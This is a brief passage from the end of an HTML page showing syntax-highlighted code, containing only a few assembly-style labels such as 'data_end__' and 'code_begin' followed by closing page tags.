</span><span class="sc5">data_end__</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc9">end</span><span class="sc0">      </span><span class="sc5">code_begin</span><span class="sc0">
</span></div></body>
</html>
